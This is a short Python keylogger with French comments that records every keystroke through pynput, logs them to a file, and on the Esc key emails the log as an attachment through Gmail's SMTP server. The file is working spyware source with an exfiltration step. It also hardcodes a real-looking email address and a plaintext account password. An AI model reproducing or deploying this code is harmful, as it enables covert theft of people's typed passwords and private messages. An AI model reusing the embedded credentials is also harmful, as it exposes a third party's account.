from pynput.keyboard import Key, Listener
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import socket
import smtplib

# Date actuelle de sauvegarde du fichier : eg. : 2020-09-17 09:26:13
date_time = datetime.datetime.now().strftime(("%Y-%m-%d : %H-%M-%S"))

# Variable contenant les touches appuyées
keys = []

filename = './myfile.txt'
file = open(filename, 'a+')     # + : crée le fichier si inexistant / a : fin du fichier
file.write("\n\n" + date_time + "\n")


print(date_time)

def on_press(key):
    global keys
    keys.append(str(key).replace("'", ""))
    print(keys[-1])
    if len(keys) > 10:      # Toutes les 10 frappes, on écrit dans le fichier
        write_keys(keys)
        keys = []

def write_keys(keys):
    for key in keys:
        if key == 'Key.enter':          # <Enter> = nouvelle ligne
                file.write("\n")
        elif key == 'Key.space':        # <Space> = met un espace
            file.write(key.replace("Key.space"," "))
        elif key == 'Key.backspace':    # <Backspace> = on met un "$"
            # EX. well$come --> welcome (mot correct)
            file.write(key.replace("Key.backspace", "$"))
        else:
            file.write(key)

def on_release(key):
    if (key == Key.esc):
        file.close()
        send_email()
        return False

# Vérifie si on a une connection Internet
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False

def send_email():
    # Infos pour le mail
    fromaddr = "quentin.rivollat@gmail.com"
    toaddr = "quentin.rivollat@etu.unige.ch"
    password = "U2hW3vc5"

    msg = MIMEMultipart()
    msg['From'] = fromaddr              # Origine
    msg['To'] = toaddr                  # Destinataire
    msg['Subject'] = "data"             # Sujet
    body = "TEXT YOU WANT TO SEND"      # Body
    msg.attach(MIMEText(body, 'plain')) # Attache le corps
    attachment = open(filename, "rb")   # Fichier log à envoyer

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',
                    "attachment; filename= %s" % filename)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)    # SMTP
    server.ehlo()
    server.starttls()                               # Connexion sécurisée
    server.login(fromaddr, password)                # Connexion au service
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

# Définit les actions à faire à l'appui de chaque touche
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
